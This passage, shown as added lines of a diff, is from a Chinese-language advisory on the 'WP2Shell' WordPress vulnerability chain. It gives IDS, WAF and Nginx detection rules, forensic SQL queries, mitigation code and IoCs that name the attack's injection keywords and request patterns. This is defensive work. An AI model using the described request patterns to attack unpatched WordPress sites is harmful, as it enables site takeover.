+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;customize_changeset&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">nocase</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;UNION&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">nocase</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">web</span><span class="o">-</span><span class="nx">application</span><span class="o">-</span><span class="nx">attack</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">2026630003</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+
+<span class="err">#</span><span class="w"> </span><span class="nx">规则4</span><span class="p">:</span><span class="w"> </span><span class="nx">检测</span><span class="w"> </span><span class="nx">RCE</span><span class="w"> </span><span class="nx">阶段</span><span class="err">——</span><span class="nx">admin上下文创建用户</span>
+<span class="nx">alert</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="err">$</span><span class="nx">EXTERNAL_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="err">$</span><span class="nx">HOME_NET</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="p">(</span>
+<span class="w">    </span><span class="nx">msg</span><span class="p">:</span><span class="s">&quot;WORDPRESS WP2Shell RCE stage admin user creation&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">flow</span><span class="p">:</span><span class="nx">established</span><span class="p">,</span><span class="nx">to_server</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">method</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;POST&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">uri</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;/wp-json/wp/v2/users&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">http</span><span class="p">.</span><span class="nx">request_body</span><span class="p">;</span><span class="w"> </span><span class="nx">content</span><span class="p">:</span><span class="s">&quot;administrator&quot;</span><span class="p">;</span><span class="w"> </span><span class="nx">nocase</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">threshold</span><span class="p">:</span><span class="k">type</span><span class="w"> </span><span class="nx">both</span><span class="p">,</span><span class="w"> </span><span class="nx">count</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="nx">seconds</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span><span class="w"> </span><span class="nx">track</span><span class="w"> </span><span class="nx">by_src</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">classtype</span><span class="p">:</span><span class="nx">web</span><span class="o">-</span><span class="nx">application</span><span class="o">-</span><span class="nx">attack</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">sid</span><span class="p">:</span><span class="mi">2026630004</span><span class="p">;</span><span class="w"> </span><span class="nx">rev</span><span class="p">:</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">)</span>
+</code></pre></div>
+
+<h3>7.3 数据库痕迹检测</h3>
+<p>攻击者伪造的 <code>customize_changeset</code> 行会在数据库留下可检测痕迹。执行以下 SQL 查询检测被入侵迹象：</p>
+<div class="highlight"><pre><span></span><code><span class="c1">-- 检测1: 异常的 customize_changeset 文章（合法站点通常很少或没有pending状态）</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">ID</span><span class="p">,</span><span class="w"> </span><span class="n">post_author</span><span class="p">,</span><span class="w"> </span><span class="n">post_title</span><span class="p">,</span><span class="w"> </span><span class="n">post_status</span><span class="p">,</span><span class="w"> </span><span class="n">post_date</span><span class="p">,</span><span class="w"> </span><span class="n">post_modified</span>
+<span class="k">FROM</span><span class="w"> </span><span class="n">wp_posts</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">post_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;customize_changeset&#39;</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">post_status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;pending&#39;</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">post_date</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="s1">&#39;2026-07-17&#39;</span><span class="p">;</span>
+
+<span class="c1">-- 检测2: 检测异常 _changeset_user meta（指向admin的伪造变更集）</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">pm</span><span class="p">.</span><span class="n">post_id</span><span class="p">,</span><span class="w"> </span><span class="n">pm</span><span class="p">.</span><span class="n">meta_value</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">forged_user_id</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">post_title</span>
+<span class="k">FROM</span><span class="w"> </span><span class="n">wp_postmeta</span><span class="w"> </span><span class="n">pm</span>
+<span class="k">JOIN</span><span class="w"> </span><span class="n">wp_posts</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">ID</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pm</span><span class="p">.</span><span class="n">post_id</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">pm</span><span class="p">.</span><span class="n">meta_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;_changeset_user&#39;</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">pm</span><span class="p">.</span><span class="n">meta_value</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span>
+<span class="w">      </span><span class="k">SELECT</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">wp_users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">user_level</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">10</span>
+<span class="w">  </span><span class="p">)</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">post_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;customize_changeset&#39;</span><span class="p">;</span>
+
+<span class="c1">-- 检测3: 检测异常新建管理员账户（RCE阶段产物）</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">ID</span><span class="p">,</span><span class="w"> </span><span class="n">user_login</span><span class="p">,</span><span class="w"> </span><span class="n">user_email</span><span class="p">,</span><span class="w"> </span><span class="n">user_registered</span>
+<span class="k">FROM</span><span class="w"> </span><span class="n">wp_users</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">user_registered</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="s1">&#39;2026-07-17&#39;</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">ID</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span>
+<span class="w">      </span><span class="k">SELECT</span><span class="w"> </span><span class="n">user_id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">wp_usermeta</span>
+<span class="w">      </span><span class="k">WHERE</span><span class="w"> </span><span class="n">meta_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;wp_user_level&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">meta_value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;10&#39;</span>
+<span class="w">  </span><span class="p">)</span>
+<span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">user_registered</span><span class="w"> </span><span class="k">DESC</span><span class="p">;</span>
+
+<span class="c1">-- 检测4: 检测近期激活的插件（自毁可能遗漏痕迹）</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">option_name</span><span class="p">,</span><span class="w"> </span><span class="n">option_value</span>
+<span class="k">FROM</span><span class="w"> </span><span class="n">wp_options</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">option_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;active_plugins&#39;</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">option_value</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+<span class="c1">-- 检测5: 检测 oEmbed 缓存异常（伪造行残留）</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">ID</span><span class="p">,</span><span class="w"> </span><span class="n">post_title</span><span class="p">,</span><span class="w"> </span><span class="n">post_type</span><span class="p">,</span><span class="w"> </span><span class="n">post_content</span>
+<span class="k">FROM</span><span class="w"> </span><span class="n">wp_posts</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">post_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;oembed_cache&#39;</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">post_content</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%[payload_shortcode]%&#39;</span><span class="p">;</span>
+
+<span class="c1">-- 检测6: 检测 customize_changeset 中可疑 shortcode 内容</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="n">ID</span><span class="p">,</span><span class="w"> </span><span class="n">post_content</span>
+<span class="k">FROM</span><span class="w"> </span><span class="n">wp_posts</span>
+<span class="k">WHERE</span><span class="w"> </span><span class="n">post_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;customize_changeset&#39;</span>
+<span class="w">  </span><span class="k">AND</span><span class="w"> </span><span class="n">post_content</span><span class="w"> </span><span class="n">REGEXP</span><span class="w"> </span><span class="s1">&#39;\\\\[[a-z_]+\\\\]&#39;</span><span class="p">;</span>
+</code></pre></div>
+
+<hr />
+<h2>八、修复方案与 WAF 规则</h2>
+<h3>8.1 官方修复</h3>
+<p>升级至 <strong>WordPress 6.9.5+</strong> 或 <strong>7.0.2+</strong>，这两个版本已修复两个 CVE：</p>
+<ul>
+<li><strong>CVE-2026-63030 修复</strong>：批量端点的验证数组与执行数组改为单一统一结构，移除并行数组设计；错误路径下同步移除两个数组中的对应条目，消除下标错位可能。</li>
+<li><strong>CVE-2026-60137 修复</strong>：<code>WP_Query</code> 中对所有传入参数强制类型断言，<code>author__not_in</code>（及同类 <code>__in</code> / <code>__not_in</code> 参数）必须为整数数组，字符串输入直接拒绝；同时将 SQL 拼接改为 <code>$wpdb-&gt;prepare()</code> 占位符方式。</li>
+</ul>
+<h3>8.2 临时缓解措施</h3>
+<p>无法立即升级时的临时措施：</p>
+<ol>
+<li><strong>禁用批量端点</strong>：在 <code>functions.php</code> 或 MU 插件中移除 batch 路由。</li>
+<li><strong>启用对象缓存</strong>：部署 Redis/Memcached 阻断 RCE 链（注意 SQLi 仍可利用，仅阻断 RCE 升级）。</li>
+<li><strong>WAF 拦截</strong>：见 8.3 节。</li>
+</ol>
+<div class="highlight"><pre><span></span><code><span class="x">// 临时缓解：禁用 REST API 批量端点</span>
+<span class="x">add_filter( &#39;rest_endpoints&#39;, function ( $endpoints ) {</span>
+<span class="x">    if ( isset( $endpoints[&#39;/batch/v1&#39;] ) ) {</span>
+<span class="x">        unset( $endpoints[&#39;/batch/v1&#39;] );</span>
+<span class="x">    }</span>
+<span class="x">    return $endpoints;</span>
+<span class="x">}, PHP_INT_MAX );</span>
+
+<span class="x">// 临时缓解：强制 author__not_in 为数组类型</span>
+<span class="x">add_filter( &#39;rest_request_before_callbacks&#39;, function ( $response, $handler, $request ) {</span>
+<span class="x">    $params = $request-&gt;get_query_params();</span>
+<span class="x">    if ( isset( $params[&#39;author__not_in&#39;] ) &amp;&amp; ! is_array( $params[&#39;author__not_in&#39;] ) ) {</span>
+<span class="x">        return new WP_Error(</span>
+<span class="x">            &#39;wp2shell_mitigation&#39;,</span>
+<span class="x">            &#39;author__not_in 必须为数组&#39;,</span>
+<span class="x">            array( &#39;status&#39; =&gt; 400 )</span>
+<span class="x">        );</span>
+<span class="x">    }</span>
+<span class="x">    return $response;</span>
+<span class="x">}, 10, 3 );</span>
+</code></pre></div>
+
+<h3>8.3 WAF 规则</h3>
+<h4>8.3.1 ModSecurity 规则</h4>
+<div class="highlight"><pre><span></span><code><span class="c"># 规则1: 拦截批量端点中的 author__not_in 非数组注入</span>
+<span class="nb">SecRule</span><span class="w"> </span>REQUEST_URI<span class="w"> </span><span class="s2">&quot;@contains /wp-json/batch/v1&quot;</span><span class="w"> </span>\
+<span class="w">    </span><span class="s2">&quot;id:202663010,phase:2,pass,nolog,chain&quot;</span>
+<span class="w">    </span><span class="nb">SecRule</span><span class="w"> </span>REQUEST_BODY<span class="w"> </span><span class="s2">&quot;@rx (?i)author__not_in[^&amp;]*(?:UNION|SELECT|SLEEP|AND\s|BENCHMARK)&quot;</span><span class="w"> </span>\
+<span class="w">        </span><span class="s2">&quot;id:202663011,phase:2,deny,status:403,msg:&#39;WP2Shell CVE-2026-60137 SQLi via batch&#39;,\</span>
+<span class="s2">        log,auditlog,severity:CRITICAL,tag:&#39;attack/sqli&#39;,tag:&#39;cve/2026-60137&#39;&quot;</span>
+
+<span class="c"># 规则2: 拦截 WP2Shell 路由混淆特征组合</span>
+<span class="nb">SecRule</span><span class="w"> </span>REQUEST_URI<span class="w"> </span><span class="s2">&quot;@contains /wp-json/batch/v1&quot;</span><span class="w"> </span>\
+<span class="w">    </span><span class="s2">&quot;id:202663020,phase:2,pass,nolog,chain&quot;</span>
+<span class="w">    </span><span class="nb">SecRule</span><span class="w"> </span>REQUEST_BODY<span class="w"> </span><span class="s2">&quot;@contains /wp/v2/widgets&quot;</span><span class="w"> </span><span class="s2">&quot;chain&quot;</span>
+<span class="w">        </span><span class="nb">SecRule</span><span class="w"> </span>REQUEST_BODY<span class="w"> </span><span class="s2">&quot;@contains /wp/v2/posts&quot;</span><span class="w"> </span><span class="s2">&quot;chain&quot;</span>
+<span class="w">            </span><span class="nb">SecRule</span><span class="w"> </span>REQUEST_BODY<span class="w"> </span><span class="s2">&quot;@rx (?i)per_page&quot;</span><span class="w"> </span>\
+<span class="w">                </span><span class="s2">&quot;id:202663021,phase:2,deny,status:403,\</span>
+<span class="s2">                msg:&#39;WP2Shell CVE-2026-63030 routing desync pattern&#39;,\</span>
+<span class="s2">                log,auditlog,severity:CRITICAL,tag:&#39;attack/auth-bypass&#39;,\</span>
+<span class="s2">                tag:&#39;cve/2026-63030&#39;&quot;</span>
+
+<span class="c"># 规则3: 拦截 customize_changeset 伪造（UNION注入升级RCE）</span>
+<span class="nb">SecRule</span><span class="w"> </span>REQUEST_BODY<span class="w"> </span><span class="s2">&quot;@rx (?i)(UNION.*customize_changeset|customize_changeset.*UNION)&quot;</span><span class="w"> </span>\
+<span class="w">    </span><span class="s2">&quot;id:202663030,phase:2,deny,status:403,\</span>
+<span class="s2">    msg:&#39;WP2Shell UNION injection forging changeset&#39;,\</span>
+<span class="s2">    log,auditlog,severity:CRITICAL,tag:&#39;attack/sqli&#39;,tag:&#39;wp2shell-rce-stage1&#39;&quot;</span>
+</code></pre></div>
+
+<h4>8.3.2 Nginx 原生规则</h4>
+<div class="highlight"><pre><span></span><code><span class="c1"># 在 server 块中拦截批量端点的注入请求</span>
+<span class="k">location</span><span class="w"> </span><span class="p">~</span><span class="w"> </span><span class="sr">^/wp-json/batch/v1</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1"># 检测 author__not_in 注入特征</span>
+<span class="w">    </span><span class="kn">if</span><span class="w"> </span><span class="s">(</span><span class="nv">$request_body</span><span class="w"> </span><span class="p">~</span><span class="sr">*</span><span class="w"> </span><span class="s">&quot;(author__not_in[^&amp;]*(UNION|SELECT|SLEEP|AND\s|BENCHMARK))&quot;)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kn">return</span><span class="w"> </span><span class="mi">403</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1"># 检测路由混淆特征组合</span>
+<span class="w">    </span><span class="kn">if</span><span class="w"> </span><span class="s">(</span><span class="nv">$request_body</span><span class="w"> </span><span class="p">~</span><span class="sr">*</span><span class="w"> </span><span class="s">&quot;(/wp/v2/widgets.*(/wp/v2/posts|per_page))&quot;)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kn">return</span><span class="w"> </span><span class="mi">403</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1"># 检测 customize_changeset 伪造</span>
+<span class="w">    </span><span class="kn">if</span><span class="w"> </span><span class="s">(</span><span class="nv">$request_body</span><span class="w"> </span><span class="p">~</span><span class="sr">*</span><span class="w"> </span><span class="s">&quot;(UNION.*customize_changeset)&quot;)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kn">return</span><span class="w"> </span><span class="mi">403</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="c1"># 默认放行合法批量请求</span>
+<span class="w">    </span><span class="kn">proxy_pass</span><span class="w"> </span><span class="s">http://wordpress_backend</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h4>8.3.3 Cloudflare WAF 表达式</h4>
+<div class="highlight"><pre><span></span><code><span class="gh">#</span> 表达式1: 拦截 WP2Shell SQL注入
+(http.request.uri.path contains &quot;/wp-json/batch/v1&quot;) 
+and (http.request.body.raw contains &quot;author__not_in&quot;) 
+and (http.request.body.raw matches &quot;(?i)(UNION|SELECT|SLEEP|BENCHMARK)&quot;)
+
+<span class="gh">#</span> 表达式2: 拦截路由混淆特征
+(http.request.uri.path contains &quot;/wp-json/batch/v1&quot;) 
+and (http.request.body.raw contains &quot;/wp/v2/widgets&quot;) 
+and (http.request.body.raw contains &quot;/wp/v2/posts&quot;) 
+and (http.request.body.raw contains &quot;per_page&quot;)
+
+<span class="gh">#</span> 表达式3: 拦截 RCE 升级阶段
+(http.request.body.raw matches &quot;(?i)(UNION.*customize_changeset)&quot;) 
+or (http.request.body.raw matches &quot;(?i)(customize_changeset.*UNION)&quot;)
+</code></pre></div>
+
+<hr />
+<h2>九、深度技术总结</h2>
+<h3>9.1 漏洞链的精妙之处</h3>
+<p>WP2Shell 的危害性不在于单个漏洞的严重程度，而在于两个"半残"漏洞的精巧拼接：</p>
+<ol>
+<li><strong>CVE-2026-63030 单独无害</strong>：仅造成权限上下文错位，不直接产生数据泄露或代码执行。单纯的权限混淆若无后续利用点，充其量是信息泄露级别的低危问题。</li>
+<li><strong>CVE-2026-60137 单独不可达</strong>：SQL 注入点存在于需认证的端点，未认证攻击者无法触发。但一旦认证被绕过，注入点立即暴露。</li>
+</ol>
+<p>二者单独评估时，CVSS 分别为 7.5 和 9.1，看似不至于达到灾难级。但串联后形成"认证绕过 + 注入 + 持久化 + 权限提升 + RCE"的完整 kill chain，实际危害远超两个 CVE 评分之和。这提示安全评估不能仅看单点 CVSS，必须考虑漏洞组合的链式效应。</p>
+<h3>9.2 类型混淆——PHP 生态的系统性风险</h3>
+<p>CVE-2026-60137 的根因是 PHP 的弱类型特性。<code>array_map('absint', $value)</code> 在 <code>$value</code> 为字符串时不会抛出类型错误，而是静默地将其视为字符数组处理——这种"宽容"行为在安全敏感场景下是危险的。类似问题在 PHP 生态中反复出现：</p>
+<ul>
+<li><code>in_array($needle, $haystack)</code> 默认松散比较导致的类型混淆</li>
+<li><code>strcmp()</code> 返回 <code>null</code> 被 <code>== 0</code> 判断为真导致的认证绕过</li>
+<li>数组参数与字符串参数的隐式转换导致的边界绕过</li>
+</ul>
+<p>WordPress 作为 PHP 生态最大的应用，其核心代码中大量依赖 <code>array_map</code> + <code>implode</code> 的净化模式。CVE-2026-60137 表明，一旦参数类型断言在前置层（REST API 参数校验）被绕过，后置层（WP_Query）的净化函数会因类型假设不成立而失效。<strong>安全净化不能依赖前置层的类型保证，每个边界都必须独立做类型断言</strong>。</p>
+<h3>9.3 并行数组——隐蔽的状态同步缺陷</h3>
+<p>CVE-2026-63030 的并行数组反同步是一个典型的"状态一致性"缺陷。这类缺陷的特点是：</p>
+<ul>
+<li><strong>正常路径无异常</strong>：在无错误路径下，两个数组始终对齐，功能完全正常。</li>
+<li><strong>错误路径暴露缺陷</strong>：只有特定错误条件下才触发不同步，常规测试难以覆盖。</li>
+<li><strong>影响延迟显现</strong>：错位的后果不在错误发生时立即体现，而在后续执行阶段才显现，增加了定位难度。</li>
+</ul>
+<p>这种模式在 C/C++ 的资源管理（alloc/free 不配对）、并发编程（锁获取/释放不配对）中也很常见。防御方法是<strong>避免用多个并行结构表达同一逻辑状态</strong>，改用单一结构（如对象数组，每个对象同时携带权限上下文和执行请求），从根本上消除同步需求。</p>
+<h3>9.4 oEmbed 缓存——被忽视的持久化入口</h3>
+<p>WP2Shell 攻击链中最容易被忽视的一环是 oEmbed 缓存作为持久化入口。WordPress 将 oEmbed 处理结果以文章形式存入 <code>wp_posts</code> 表，这意味着任何能向 <code>wp_posts</code> 写入内容的路径都可能被滥用为持久化载体。UNION 注入恰好提供了"向查询结果集注入任意行"的能力，配合 oEmbed 的写回机制，实现了从"读取"到"写入"的跨越。</p>
+<p>对象缓存（Redis/Memcached）改变了 oEmbed 的写入路径，意外地成为了 RCE 链的天然阻断点。这一发现具有两面性：一方面，已部署对象缓存的站点免受 RCE 威胁；另一方面，这揭示了 WordPress 缓存层的多路径写入设计可能成为安全控制的盲区——安全团队不能假设"同样的逻辑操作总是经过同一路径"。</p>
+<h3>9.5 防御启示</h3>
+<table>
+<thead>
+<tr>
+<th>启示维度</th>
+<th>具体内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>单点 vs 链式</td>
+<td>安全评估必须考虑漏洞组合的链式效应，而非孤立评估单个 CVE</td>
+</tr>
+<tr>
+<td>类型安全</td>
+<td>安全净化函数不能依赖前置层的类型保证，每个边界独立断言</td>
+</tr>
+<tr>
+<td>状态一致性</td>
+<td>避免用多个并行结构表达同一逻辑状态，消除同步缺陷</td>
+</tr>
+<tr>
+<td>缓存路径</td>
+<td>缓存层多路径写入是安全盲区，需纳入威胁建模</td>
+</tr>
+<tr>
+<td>默认安全</td>
+<td>"默认安装即可利用"是最危险的属性，需重新审视默认配置的攻击面</td>
+</tr>
+<tr>
+<td>持久化入口</td>
+<td>任何向数据库写入内容的机制（缓存、日志、草稿）都可能被滥用为持久化载体</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2>十、IoC 与威胁狩猎清单</h2>
+<h3>10.1 网络 IoC</h3>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>POST /wp-json/batch/v1</code> 含嵌套 <code>/batch/v1</code></td>
+<td>请求模式</td>
+<td>WP2Shell 嵌套批量特征</td>
+</tr>
+<tr>
+<td><code>author__not_in</code> 参数含 <code>UNION</code>/<code>SELECT</code>/<code>SLEEP</code></td>
+<td>注入特征</td>
+<td>CVE-2026-60137 触发</td>
+</tr>
+<tr>
+<td><code>/wp/v2/widgets</code> 与 <code>/wp/v2/posts</code> 同 batch 出现</td>
+<td>路由混淆</td>
+<td>CVE-2026-63030 特征</td>
+</tr>
+<tr>
+<td><code>per_page=-1</code> 配合 posts 端点</td>
+<td>注入辅助</td>
+<td>禁用分页确保注入完整执行</td>
+</tr>
+<tr>
+<td><code>POST /wp-json/wp/v2/users</code> 高频出现</td>
+<td>RCE 阶段</td>
+<td>admin 上下文创建账户</td>
+</tr>
+</tbody>
+</table>
+<h3>10.2 主机 IoC</h3>
+<div class="highlight"><pre><span></span><code><span class="c1"># 检测1: 异常 customize_changeset 文章（伪造行残留）</span>
+wp<span class="w"> </span>db<span class="w"> </span>query<span class="w"> </span><span class="s2">&quot;SELECT * FROM wp_posts WHERE post_type=&#39;customize_changeset&#39; AND post_status=&#39;pending&#39;;&quot;</span>
+
+<span class="c1"># 检测2: 近期新建管理员账户</span>
+wp<span class="w"> </span>db<span class="w"> </span>query<span class="w"> </span><span class="s2">&quot;SELECT u.* FROM wp_users u JOIN wp_usermeta um ON u.ID=um.user_id WHERE um.meta_key=&#39;wp_user_level&#39; AND um.meta_value=&#39;10&#39; AND u.user_registered &gt; &#39;2026-07-17&#39;;&quot;</span>
+
+<span class="c1"># 检测3: 异常插件文件（自毁可能遗漏）</span>
+find<span class="w"> </span>/var/www/html/wp-content/plugins/<span class="w"> </span>-name<span class="w"> </span><span class="s2">&quot;*.php&quot;</span><span class="w"> </span>-newer<span class="w"> </span>/tmp/wp2shell_marker<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># 检测4: 检查 active_plugins 中的未知插件</span>
+wp<span class="w"> </span>option<span class="w"> </span>get<span class="w"> </span>active_plugins<span class="w"> </span>--format<span class="o">=</span>json
+
+<span class="c1"># 检测5: 检测 _changeset_user meta 异常</span>
+wp<span class="w"> </span>db<span class="w"> </span>query<span class="w"> </span><span class="s2">&quot;SELECT * FROM wp_postmeta WHERE meta_key=&#39;_changeset_user&#39;;&quot;</span>
+</code></pre></div>
+
+<hr />
+<h2>十一、结语</h2>
+<p>WP2Shell 漏洞链是 2026 年最具代表性的"漏洞组合艺术"案例。它证明了一个重要的安全原则：<strong>在现代复杂系统中，单个看似中低危的漏洞，一旦找到合适的"搭子"，就能爆发出远超预期的破坏力</strong>。</p>
+<p>从防御者视角，关键教训有三：</p>
+<ol>
+<li><strong>优先修复"认证绕过"类漏洞</strong>，即使其单独 CVSS 不高。认证是所有后续利用的前提，断掉认证链即断掉整条 kill chain。</li>
+<li><strong>对参数净化做纵深防御</strong>。不要信任前置层的类型保证，每个边界独立做类型断言和净化。</li>
+<li><strong>纳入缓存路径到威胁建模</strong>。多路径写入是安全盲区，需确保所有写入路径都经过统一的安全校验。</li>
+</ol>
+<p>从攻击者视角，WP2Shell 展示了如何将"读取型"漏洞（SQL 注入）转化为"写入型"攻击（伪造数据库行），再进一步转化为"执行型"攻击（RCE）的完整跨越路径。这种思路对红队评估和漏洞挖掘具有方法论级别的参考价值。</p>
+<blockquote>
+<p><strong>免责声明</strong>：本文仅用于安全研究与防御目的。所有 PoC 代码均为概念验证，实际利用需在授权环境下进行。请勿将本文技术用于未授权攻击。</p>
+</blockquote>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
